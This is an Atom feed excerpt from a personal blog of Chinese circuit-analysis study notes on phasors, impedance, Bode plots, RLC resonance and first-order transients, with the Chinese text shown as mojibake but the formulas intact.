    <content type="html"><![CDATA[<h1 id="Ê≠£Âº¶Á®≥ÊÄÅ"><a href="#Ê≠£Âº¶Á®≥ÊÄÅ" class="headerlink" title="Ê≠£Âº¶Á®≥ÊÄÅ"></a>Ê≠£Âº¶Á®≥ÊÄÅ</h1><h2 id="Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫"><a href="#Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫" class="headerlink" title="Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫"></a>Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫</h2><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)&#x3D;Re[\dot{U_m}e^{jw t}]<br>$$</p><p>$$<br>\dot{U_m}&#x3D;U_me^{j\psi}&#x3D;U_m\angle\psi<br>$$</p><p>Áî±<strong>Ê¨ßÊãâÂÖ¨Âºè</strong><br>$$<br>\cos \theta + j\sin \theta&#x3D;e^{j\theta}<br>$$<br>Êúâ<br>$$<br>Re[\dot{U_m}e^{jw t}]&#x3D;U_m\cos[wt+\psi]<br>$$</p><p>$$<br>Im[\dot{U_m}e^{jw t}]&#x3D;U_m\sin[wt+\psi]<br>$$</p><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)\longleftrightarrow\dot{U_m}&#x3D;U_m\angle\psi<br>$$</p><blockquote><p><strong>‰∏Ä‰∏ÄÂØπÂ∫î</strong>ÁöÑÂÖ≥Á≥ªÔºåË°®Á§∫ÊØè‰∏Ä‰∏™Ê≠£Âº¶Ê≥¢ÈÉΩÂèØ‰ª•Áî±‰∏Ä‰∏™Áõ∏ÈáèË°®Á§∫</p></blockquote><p>ÂæÆÂàÜ‚Äî‚Äî‰ª£Êï∞</p><p>Êó∂Âüü‚Äî‚ÄîÈ¢ëÂüü</p><h3 id="Âπø‰πâÊ¨ßÂßÜÂÆöÂæã"><a href="#Âπø‰πâÊ¨ßÂßÜÂÆöÂæã" class="headerlink" title="Âπø‰πâÊ¨ßÂßÜÂÆöÂæã"></a>Âπø‰πâÊ¨ßÂßÜÂÆöÂæã</h3><h4 id="capacitor"><a href="#capacitor" class="headerlink" title="capacitor"></a>capacitor</h4><p>$$<br>V_C&#x3D;Z_CI_C<br>$$</p><p>$$<br>Z_C&#x3D;\frac{1}{jwC}<br>$$</p><blockquote><p>Ê≠§Â§Ñ$ j $ÁöÑÂê´‰πâÔºöÊ¨ßÊãâÂÖ¨Âºè‰ª£ÂÖ•$ \frac{\pi}{2} $ÂæóÂà∞$ j&#x3D;e^{j\frac{\pi}{2}} $ ÔºåÊïÖÂèØ‰ΩìÁé∞ÁîµÊµÅË∂ÖÂâçÁîµÂéã90¬∞</p></blockquote><h4 id="inductor"><a href="#inductor" class="headerlink" title="inductor"></a>inductor</h4><p>$$<br>V_I&#x3D;Z_II_I<br>$$</p><p>$$<br>Z_I&#x3D;jwL<br>$$</p><h4 id="resistor"><a href="#resistor" class="headerlink" title="resistor"></a>resistor</h4><p>$$<br>u\space know<br>$$</p><h3 id="Tips-Â§çÊï∞ËøêÁÆó"><a href="#Tips-Â§çÊï∞ËøêÁÆó" class="headerlink" title="Tips.Â§çÊï∞ËøêÁÆó"></a>Tips.Â§çÊï∞ËøêÁÆó</h3><p><strong>‰πòÊ≥ï</strong>ÔºöÊ®°Áõ∏‰πòÔºåËßíÁõ∏Âä†</p><p><strong>Èô§Ê≥ï</strong>ÔºöÊ®°Áõ∏Èô§ÔºåËßíÁõ∏Âáè</p><h3 id="‰º†ÈÄíÂáΩÊï∞"><a href="#‰º†ÈÄíÂáΩÊï∞" class="headerlink" title="‰º†ÈÄíÂáΩÊï∞"></a>‰º†ÈÄíÂáΩÊï∞</h3><p>Á≥ªÁªüÂáΩÊï∞ÔºåÁΩëÁªúËæìÂá∫Â§çÂπÖÂÄº‰∏éËæìÂÖ•Â§çÂπÖÂÄºÁöÑÊØîÂÄº<br>$$<br>H(jw)&#x3D;\frac{\dot{U}_2}{\dot{U}_1}&#x3D;|H(jw)|\angle \theta(w)<br>$$</p><p>ÂÖ∂‰∏≠<br>$$<br>|H(jw)|&#x3D;\frac{U_2}{U_1}<br>$$</p><p>$$<br>\theta(w)&#x3D;\psi_2-\psi_1<br>$$</p><h3 id="È¢ëÁéáÂìçÂ∫î"><a href="#È¢ëÁéáÂìçÂ∫î" class="headerlink" title="È¢ëÁéáÂìçÂ∫î"></a>È¢ëÁéáÂìçÂ∫î</h3><p>ÂπÖÂÄºÂíåÁõ∏‰Ωç‰Ωú‰∏∫È¢ëÁéáÁöÑÂáΩÊï∞ÁöÑÂõæÂΩ¢</p><p>ÂπÖÈ¢ëÂìçÂ∫î + Áõ∏È¢ëÂìçÂ∫î &#x3D; Ê≥¢ÁâπÂõæ</p><p><del>ÔºàËÄÉËØïÁîªÂ§ßËá¥ÂπÖÈ¢ëÂõæÔºâ</del></p><h3 id="e-g-RLÁîµË∑Ø"><a href="#e-g-RLÁîµË∑Ø" class="headerlink" title="e.g.RLÁîµË∑Ø"></a>e.g.RLÁîµË∑Ø</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521230513617.png" alt="image-20230521230513617"><br>$$<br>V_o&#x3D;\frac{R}{R+Ls}V_i<br>$$</p><p>$$<br>H(jw)&#x3D;\frac{V_o}{V_i}&#x3D;\frac{R}{R+sL}<br>$$</p><p>$$<br>when\space W_0&#x3D;\frac{R}{L}&#x3D;\frac{1}{\tau},H&#x3D;\frac{1}{\sqrt{2}}<br>$$</p><p>$$<br>\lg H&#x3D;\lg\frac{w_0}{\sqrt{w_0^2+w^2}}<br>$$</p><p>$$<br>when\space w\gg w_0,20\lg H&#x3D;-20\lg\frac{W}{W_0}<br>$$</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521231014421.png" alt="image-20230521231014421"></p><p><strong>Ê≥¢ÁâπÂõæÔºö</strong>$20\lg|H(jw)|$Âíå$\theta(w)$Áõ∏ÂØπ‰∫éÂØπÊï∞È¢ëÁéáÂùêÊ†áÁöÑÁâπÊÄßÊõ≤Á∫ø„ÄÇÁ∫µÂùêÊ†áÁî®dB‰Ωú‰∏∫Âçï‰Ωç</p><p>Âè¶Ôºö</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232047380.png" alt="image-20230521232047380"></p><h2 id="‰∏ÄÈò∂RC-RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ"><a href="#‰∏ÄÈò∂RC-RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ" class="headerlink" title="‰∏ÄÈò∂RC&#x2F;RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ"></a>‰∏ÄÈò∂RC&#x2F;RLÁîµË∑ØÈ¢ëÁéáÂìçÂ∫îËøë‰ººÊäòÁ∫øÂõæ</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232656917.png" alt="image-20230521232656917"></p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232444210.png" alt="image-20230521232444210"></p><p>ËΩ¨ÊäòÈ¢ëÁéá$w&#x3D;\frac{1}{RC}$‰ΩéÈ¢ëÊ∏êËøëÁ∫øÈ´òÈ¢ëÊ∏êËøëÁ∫øËΩ¨ÊäòÈ¢ëÁéáÂ§ÑÁõ∏Áßª$45¬∞$</p><h3 id="Êª§Ê≥¢Âô®"><a href="#Êª§Ê≥¢Âô®" class="headerlink" title="Êª§Ê≥¢Âô®"></a>Êª§Ê≥¢Âô®</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192346957.png" alt="image-20230521192346957"></p><p><strong>nÈò∂Êª§Ê≥¢Âô®Ôºö</strong>$w$ÊØè‰∏äÂçá10ÂÄçÔºå‰∏ãÈôç20dBÁöÑnÂÄç</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522130629436.png" alt="image-20230522130629436"></p><h2 id="ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ"><a href="#ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ" class="headerlink" title="ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ"></a>ÊîæÂ§ßÂô®Á∫ßÈó¥Ëß£ËÄ¶ÔºàÂæÖÔºâ</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192352972.png" alt="image-20230521192352972"></p><h2 id="Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ"><a href="#Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ" class="headerlink" title="Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ"></a>Ë°•ÂÅøÁîµË∑ØÔºàÂæÖÔºâ</h2><h2 id="ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè"><a href="#ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè" class="headerlink" title="ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè"></a>ÈòªÊäó‰∏≠ÁöÑÂäüÁéá‰∏éËÉΩÈáè</h2><h1 id="Ë∞êÊåØÁîµË∑Ø"><a href="#Ë∞êÊåØÁîµË∑Ø" class="headerlink" title="Ë∞êÊåØÁîµË∑Ø"></a>Ë∞êÊåØÁîµË∑Ø</h1><h2 id="RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø"><a href="#RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø" class="headerlink" title="RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø"></a>RLC‰∏≤ËÅîË∞êÊåØÁîµË∑Ø</h2><p>$$<br>Z(jw)&#x3D;\frac{\dot{U}}{\dot{I}}&#x3D;R+j(wL-\frac{1}{wC})&#x3D;|Z(jw)|\angle\theta(w)<br>$$</p><h3 id="Ë∞êÊåØÊù°‰ª∂"><a href="#Ë∞êÊåØÊù°‰ª∂" class="headerlink" title="Ë∞êÊåØÊù°‰ª∂"></a>Ë∞êÊåØÊù°‰ª∂</h3><p>$$<br>w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}<br>$$</p><p>$w_0$Áß∞‰∏∫ÁîµË∑Ø<strong>Âõ∫ÊúâË∞êÊåØËßíÈ¢ëÁéá</strong><br>$$<br>f&#x3D;f_0&#x3D;\frac{1}{2\pi\sqrt{LC}}<br>$$<br>RLC‰∏≤ËÅîÁîµË∑ØÂú®Ë∞êÊåØÊó∂ÊÑüÊäóÂíåÂÆπÊäóÈáèÂÄº‰∏äÁõ∏Á≠âÔºåÂÄº‰∏∫Ë∞êÊåØÁîµË∑ØÁöÑ<strong>ÁâπÊÄßÈòªÊäó</strong><br>$$<br>\rho &#x3D;w_0L&#x3D;\frac{1}{w_0C}&#x3D;\sqrt{\frac{L}{C}}<br>$$</p><h3 id="Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ"><a href="#Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ" class="headerlink" title="Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ"></a>Ë∞êÊåØÊó∂ÁîµÂéãÁîµÊµÅ</h3><p>$$<br>Z(jw)&#x3D;R<br>$$</p><p>ÈòªÊäóÂëàÁ∫ØÁîµÈòªÔºåËææÊúÄÂ∞èÂÄº</p><p>ÁîµÊµÅËææÊúÄÂ§ßÂÄºÔºå‰∏î‰∏éÁîµÂéãÊ∫êÁîµÂéãÂêåÁõ∏<br>$$<br>Q&#x3D;\frac{w_0L}{R}&#x3D;\frac{1}{w_0RC}&#x3D;\frac{\rho}{R}<br>$$<br>Q‰∏∫‰∏≤ËÅîË∞êÊåØÁîµË∑ØÁöÑ<strong>ÂìÅË¥®Âõ†Á¥†</strong></p><p>ÂêÑÂ§ÑÁîµÂéãÔºö<br>$$<br>\dot{U}_R&#x3D;\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_L&#x3D;jQ\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_C&#x3D;-jQ\dot{U}_S<br>$$</p><h3 id="Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè"><a href="#Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè" class="headerlink" title="Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè"></a>Ë∞êÊåØÊó∂ÂäüÁéáËÉΩÈáè</h3><p>Áî±‰∫é$u(t)&#x3D;u_L(t)+u_C(t)&#x3D;0$ÔºàÁõ∏ÂΩì‰∫éËôöÁü≠Ë∑ØÔºâÔºå‰ªª‰ΩïÊó∂ÂàªËøõÂÖ•ÁîµÊÑüÁîµÂÆπÊÄªÁû¨Êó∂ÂäüÁéá‰∏∫0ÔºåÁîµÂéãÊ∫êÂèëÂá∫ÁöÑÂäüÁéá<strong>ÂÖ®ÈÉ®</strong>Ë¢´ÁîµÈòªÂê∏Êî∂</p><h3 id="Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß"><a href="#Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß" class="headerlink" title="Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß"></a>Ë∞êÊåØÁîµË∑ØÁöÑÈ¢ëÁéáÁâπÊÄß</h3><p>‰∏≤ËÅîË∞êÊåØÁîµË∑Ø</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522170355601.png" alt="image-20230522170355601"><br>$$<br>|H(jw)|&#x3D;\frac{1}{\sqrt{1+Q^2(\frac{w}{w_0}-\frac{w_0}{w})^2}}<br>$$<br>ÂΩì$w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}$ÁîµË∑ØÂèëÁîüË∞êÊåØÔºåËææÊúÄÂ§ßÂÄºÔºåÁîµË∑ØÊúâ<strong>Â∏¶ÈÄöÊª§Ê≥¢ÁâπÊÄß</strong></p><p>$|H(jw)|&#x3D;\frac{1}{\sqrt{2}}$ÔºåÂç≥-3dBÊó∂ÔºåÂ∏¶ÂÆΩÔºö$\Delta w&#x3D;\frac{w_0}{Q}&#x3D;2\alpha&#x3D;\frac{1}{\tau}$</p><p>ÊïÖÂ∏¶ÂÆΩ$\Delta w$‰∏éÂìÅË¥®Âõ†Á¥†$Q$ÊàêÂèçÊØîÔºåÈÄöÂ∏¶Ë∂äÁ™ÑÔºåÊõ≤Á∫øË∂äÂ∞ñÈîêÔºåÂØπ‰ø°Âè∑ÈÄâÊã©ÊÄßË∂äÂ•Ω</p><p><strong>ÈÄöÁî®Ë∞êÊåØÊõ≤Á∫ø</strong>ÔºàÊ®™Á∫µÂùêÊ†áÈÉΩÊòØÁõ∏ÂØπÈáèÔºâ</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522171539550.png" alt="image-20230522171539550"></p><p>ÂΩì$w&#x3D;w_+\space or\space w_-$Êó∂Ôºå$|H(jw)|&#x3D;0.707(-3dB),\theta &#x3D;\pm 45^„ÄÇ$</p><h2 id="RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø"><a href="#RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø" class="headerlink" title="RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø"></a>RLCÂπ∂ËÅîË∞êÊåØÁîµË∑Ø</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522172056625.png" alt="image-20230522172056625"></p><p>ÊáíÂæóÂÜô‰∫ÜÔºåÊÄé‰πàÂõû‰∫ãÂë¢:shit:</p><p>Á¥Ø‰∫ÜüòëÔ∏èÔºåÂ≠¶‰∏™Ê®°ÁîµÂÖà</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ê≠£Âº¶Á®≥ÊÄÅ&quot;&gt;&lt;a href=&quot;#Ê≠£Âº¶Á®≥ÊÄÅ&quot; class=&quot;headerlink&quot; title=&quot;Ê≠£Âº¶Á®≥ÊÄÅ&quot;&gt;&lt;/a&gt;Ê≠£Âº¶Á®≥ÊÄÅ&lt;/h1&gt;&lt;h2 id=&quot;Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫&quot;&gt;&lt;a href=&quot;#Ê≠£Âº¶ÁîµÂéãÁîµÊµÅÁöÑÁõ∏ÈáèË°®Á§∫&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="ESE" scheme="http://deepunk.icu/categories/ESE/"/>
    
    
    <category term="ÁîµË∑ØÂàÜÊûê" scheme="http://deepunk.icu/tags/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Âä®ÊÄÅÁîµË∑ØÂèäÁû¨ÊÄÅÂàÜÊûê</title>
    <link href="http://deepunk.icu/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/"/>
    <id>http://deepunk.icu/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/</id>
    <published>2023-05-20T02:12:43.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>$V_D$Ë°®Â§ßDCÔºå$v_D$Ë°®ÂÖ®‰ø°Âè∑Ôºå$v_d$Ë°®Â∞èAC</p><p>ÁÉ≠ÁîµÂéãÂ∏∏Êï∞$V_T&#x3D;\frac{k}{q}T$Âú®Â∏∏Ê∏©(27Â∫¶)ÈªòËÆ§‰∏∫26mV</p><p>$V_S$ÂüüÂÄºÁîµÂéã$V_{TH}$‰∏∫BJTÈáçË¶ÅÂèÇÊï∞</p></blockquote><h1 id="ÁîµÂÆπ-ÁîµÊÑü"><a href="#ÁîµÂÆπ-ÁîµÊÑü" class="headerlink" title="ÁîµÂÆπ&amp;ÁîµÊÑü"></a>ÁîµÂÆπ&amp;ÁîµÊÑü</h1><h2 id="ÁîµÂÆπ"><a href="#ÁîµÂÆπ" class="headerlink" title="ÁîµÂÆπ"></a>ÁîµÂÆπ</h2><h3 id="Ê®°Âûã"><a href="#Ê®°Âûã" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h3><p>$$<br>q&#x3D;CU<br>$$</p><p>$$<br>i(t)&#x3D;\frac{dq}{dt}&#x3D;C\frac{du}{dt}<br>$$</p><p>$$<br>u_c(t)&#x3D;\frac{1}{C}\int_{-\infty}^0i(\xi)d\xi+\frac{1}{C}\int^t_0i(\xi)d\xi<br>$$</p><h3 id="ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß"><a href="#ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß" class="headerlink" title="ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß"></a>ÁîµÂéãÁöÑËÆ∞ÂøÜÊÄß</h3><p>Â≥∞ÂÄºÊ£ÄÊµãÂô®ÁîµË∑Ø</p><h3 id="ÁîµÂéãÁöÑËøûÁª≠ÊÄß"><a href="#ÁîµÂéãÁöÑËøûÁª≠ÊÄß" class="headerlink" title="ÁîµÂéãÁöÑËøûÁª≠ÊÄß"></a>ÁîµÂéãÁöÑËøûÁª≠ÊÄß</h3><p>ÁîµÂÆπÁîµÊµÅ<strong>ÊúâÁïå</strong>Êó∂ÔºåÁîµÂéã‰∏çËÉΩÁ™ÅÂèò</p><h3 id="ÂÇ®ËÉΩ"><a href="#ÂÇ®ËÉΩ" class="headerlink" title="ÂÇ®ËÉΩ"></a>ÂÇ®ËÉΩ</h3><p>$$<br>p(t)&#x3D;u(t)C\frac{du}{dt}<br>$$</p><p>$$<br>W(t_0,t)&#x3D;\int_{t_0}^tp(\xi)d\xi&#x3D;\frac{1}{2}C[u^2(t)-u^2(t_0)]<br>$$</p><p>Ëã•ÂàùÂßãÂÇ®ËÉΩ‰∏∫0ÔºåÂàô‰ªªÊÑèÊó∂ÂàªËÉΩÈáèÔºö<br>$$<br>W(t)&#x3D;\frac{1}{2}Cu^2(t)<br>$$<br>ÊüêÊó∂ÂàªÁîµÂÆπÂÇ®ËÉΩÂè™ÂèñÂÜ≥‰∫é<strong>ÁîµÂéã</strong>Ôºå‰∏éÁîµÊµÅÊó†ÂÖ≥</p><h3 id="‰∏≤Âπ∂ËÅî"><a href="#‰∏≤Âπ∂ËÅî" class="headerlink" title="‰∏≤Âπ∂ËÅî"></a>‰∏≤Âπ∂ËÅî</h3><p>Âπ∂ËÅîÂèòÂ§ßÔºå‰∏≤ËÅîÂèòÂ∞è</p><h2 id="ÁîµÊÑü"><a href="#ÁîµÊÑü" class="headerlink" title="ÁîµÊÑü"></a>ÁîµÊÑü</h2><h3 id="Ê®°Âûã-1"><a href="#Ê®°Âûã-1" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h3><p>$$<br>\psi &#x3D;Li<br>$$</p><p>$$<br>u(t)&#x3D;\frac{d\psi}{dt}&#x3D;L\frac{di}{dt}<br>$$</p><p>$$<br>i(t)&#x3D;\frac{1}{L}\int_{-\infty}^0u(\xi)d\xi+\frac{1}{L}\int_0^tu(\xi)d\xi<br>$$</p><h3 id="ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß"><a href="#ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß" class="headerlink" title="ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß"></a>ÁîµÊµÅÁöÑËÆ∞ÂøÜÊÄß</h3><h3 id="ÁîµÊµÅÁöÑËøûÁª≠ÊÄß"><a href="#ÁîµÊµÅÁöÑËøûÁª≠ÊÄß" class="headerlink" title="ÁîµÊµÅÁöÑËøûÁª≠ÊÄß"></a>ÁîµÊµÅÁöÑËøûÁª≠ÊÄß</h3><h3 id="ÂÇ®ËÉΩ-1"><a href="#ÂÇ®ËÉΩ-1" class="headerlink" title="ÂÇ®ËÉΩ"></a>ÂÇ®ËÉΩ</h3><p>$$<br>p(t)&#x3D;i(t)L\frac{di}{dt}<br>$$</p><p>$$<br>w(t_0,t)&#x3D;\frac{1}{2}L[i^2(t)-i^2(t_0)]<br>$$</p><p>ÊüêÊó∂ÂàªÁîµÂÆπÂÇ®ËÉΩÂè™ÂèñÂÜ≥‰∫é<strong>ÁîµÊµÅ</strong>Ôºå‰∏éÁîµÊÑüÊó†ÂÖ≥</p><h3 id="‰∏≤Âπ∂ËÅî-1"><a href="#‰∏≤Âπ∂ËÅî-1" class="headerlink" title="‰∏≤Âπ∂ËÅî"></a>‰∏≤Âπ∂ËÅî</h3><p>Âπ∂ËÅîÂèòÂ∞èÔºå‰∏≤ËÅîÂèòÂ§ß</p><h1 id="‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"><a href="#‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã" class="headerlink" title="‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"></a>‰∏ÄÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã</h1><h2 id="ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ"><a href="#ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ" class="headerlink" title="ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ"></a>ÂÖ®ÂìçÂ∫î-‰∏âË¶ÅÁ¥†Ê≥ïÔºà‰ªÖÈôêÁõ¥ÊµÅÊøÄÂä±‰∏ÄÈò∂Ôºâ</h2><p>$$<br>f(t)&#x3D;[f(0_+)-f(\infty)]e^{-\frac{t}{\tau}}+f(\infty)\space (t\geq0)<br>$$</p><blockquote><p>ÂÖ®ÂìçÂ∫î &#x3D; Âõ∫ÊúâÂìçÂ∫îÔºàÁû¨ÊÄÅÂìçÂ∫îÔºâ + Âº∫Âà∂ÂìçÂ∫îÔºàÁ®≥ÊÄÅÂìçÂ∫îÔºâ</p><p>Ê≥®ÊÑèÔºö<strong>ÈùûÁõ¥ÊµÅÊøÄÂä±</strong>‰∏ãÔºåÂõ∫ÊúâÂìçÂ∫î<strong>‰∏çÁ≠â‰∫é</strong>Áû¨ÊÄÅÂìçÂ∫îÔºåÁ®≥ÊÄÅÂìçÂ∫î<strong>‰∏çÁ≠â‰∫é</strong>Á®≥ÊÄÅÂìçÂ∫î</p><p>Áû¨ÊÄÅÂìçÂ∫îÔºöÈöètÂèòÂåñÂõ∫ÊúâÂìçÂ∫îÔºöÁî±ÂÜÖÈÉ®ÁîµË∑ØÂéüÊú¨Áä∂ÊÄÅÂºïËµ∑ÁöÑÂèòÂåñ</p></blockquote><p>$$<br>f(t)&#x3D;f(0_+)e^{-\frac{t}{\tau}}+f(\infty)(1-e^{-\frac{t}{\tau}})\space(t\geq 0)<br>$$</p><blockquote><p>ÂÖ®ÂìçÂ∫î &#x3D; Èõ∂ËæìÂÖ•ÂìçÂ∫î + Èõ∂Áä∂ÊÄÅÂìçÂ∫î</p></blockquote><p>$$<br>\tau&#x3D;R_0C\space or\space\tau&#x3D;\frac{L}{R_0}<br>$$</p><p>$\tau$ ÂÖ∑ÊúâÊó∂Èó¥‰ΩÜÈáèÁ∫≤ÔºåÁß∞‰∏∫RCÁîµË∑ØÁöÑ<strong>Êó∂Èó¥Â∏∏Êï∞</strong></p><p>‰∏ÄËà¨Áî®$3\tau$ Ê≥ïÂà§Êñ≠ÊîæÁîµËøáÁ®ãÁªìÊùüÔºåÂç≥90%</p><p>ËÆ°ÁÆóRÊó∂ÔºåÁîµÂÆπÁî®<strong>Êà¥Áª¥ÂÆÅÁ≠âÊïà</strong>ÔºåÁîµÊÑüÁî®<strong>ËØ∫È°øÁ≠âÊïà</strong></p><h3 id="warning-Ê≥®ÊÑè"><a href="#warning-Ê≥®ÊÑè" class="headerlink" title=":warning:Ê≥®ÊÑè"></a>:warning:Ê≥®ÊÑè</h3><p>ÁîµÂÆπÁîµË∑ØÈáåÔºåÁîµÊµÅ<strong>ÂèØ‰ª•Ë∑ÉÂèò</strong>ÔºõÁîµÊÑüÁîµË∑ØÈáåÔºåÁîµÂéã<strong>ÂèØ‰ª•Ë∑ÉÂèò</strong></p><p>Ê≥®ÊÑèË°®ËææÂºèËåÉÂõ¥ÊòØÂê¶ÂåÖÂê´0</p><h2 id="ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø"><a href="#ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø" class="headerlink" title="ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø"></a>ÂåÖÂê´ÂºÄÂÖ≥Â∫èÂàóÁöÑÁõ¥ÊµÅ‰∏ÄÈò∂ÁîµË∑Ø</h2><h3 id="Èò∂Ë∑ÉÂáΩÊï∞"><a href="#Èò∂Ë∑ÉÂáΩÊï∞" class="headerlink" title="Èò∂Ë∑ÉÂáΩÊï∞"></a>Èò∂Ë∑ÉÂáΩÊï∞</h3><p>$$<br>\varepsilon(t)&#x3D;\begin{cases}<br>0 &amp; t&lt;0\\<br>1 &amp; t&gt;0<br>\end{cases}<br>$$</p><p>ÂºïÂÖ•Èò∂Ë∑ÉÁîµÊµÅÊ∫êÂíåÈò∂Ë∑ÉÁîµÂéãÊ∫êÂèØ‰ª•ÁúÅÂéªÁîµË∑Ø‰∏≠ÁöÑÂºÄÂÖ≥ÔºåÂèØ‰ª•Â∫îÁî®Âè†Âä†ÂÆöÁêÜËÆ°ÁÆóÁîµË∑ØÁöÑÈõ∂Áä∂ÊÄÅÂìçÂ∫î</p><h3 id="Èò∂Ë∑ÉÂìçÂ∫î"><a href="#Èò∂Ë∑ÉÂìçÂ∫î" class="headerlink" 